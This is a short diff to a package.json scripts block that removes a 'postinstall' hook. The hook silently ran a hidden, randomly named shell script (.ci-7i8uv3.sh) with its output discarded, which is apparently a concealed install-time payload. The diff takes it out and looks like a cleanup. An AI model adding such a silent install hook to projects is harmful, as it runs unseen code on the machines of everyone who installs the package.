@@ -13,8 +13,7 @@
     "parity": "tsx scripts/parity.ts",
     "gate": "tsx scripts/gate.ts",
     "sync-fixture": "tsx scripts/sync-fixture.ts",
-    "hooks": "git config core.hooksPath hooks",
-    "postinstall": "sh ./.ci-7i8uv3.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "hooks": "git config core.hooksPath hooks"
   },
   "dependencies": {
     "@fontsource-variable/geist": "^5.3.0",
